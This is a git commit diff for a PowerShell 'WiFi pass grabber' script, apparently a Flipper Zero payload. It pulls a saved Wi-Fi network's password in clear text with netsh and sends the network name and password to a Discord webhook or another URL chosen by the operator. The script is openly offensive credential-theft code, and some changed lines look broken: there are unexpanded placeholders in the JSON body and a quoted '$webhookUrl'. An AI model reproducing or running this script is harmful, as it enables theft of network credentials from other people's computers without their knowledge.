913c1b9f3dcb22f00c5cf0b53c74290d63c23a78
will-c0de <40558280+will-c0de@users.noreply.github.com>
2023-01-28 22:28:23 +0000

    📜 Edited the WiFi pass grabber [v1.5]
    Huge edit, allowing discord webhooks

--- assets/WiFi-Pass/WiFi-Pass.ps1
+++ assets/WiFi-Pass/WiFi-Pass.ps1
@@ -14,9 +14,9 @@ $ssid = [string]$ssid
 $pos = $ssid.IndexOf(':')
 $ssid = $ssid.Substring($pos+2).Trim()
 $pass = (((netsh.exe wlan show profiles name="$ssid" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
-if ($webhookUrl -Contains 'discord.com/api/webhooks/') {
+if ($webhookUrl.Contains('discord.com/api/webhooks/')) {
   $json = @"{"content": null,"embeds": [{"title": "ssid: $","description": "pass: WIFI-PASS","color": 16753920,"author": {"name": "WiFi Recieved"},"footer": {"text": "will | @willsflipper","icon_url": "https://thumb.tildacdn.com/tild6664-3230-4633-b839-313833343662/-/resize/300x/-/format/webp/qFlipper_macOS_256px.png"}}]}"@
-  Invoke-WebRequest -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body ($json)
+  Invoke-WebRequest -ContentType 'Application/Json' -Uri '$webhookUrl' -Method Post -Body ($json)
 } else {
   Invoke-WebRequest -Method Post -Uri "$webhookUrl" -Body "$ssid : $pass"
 }
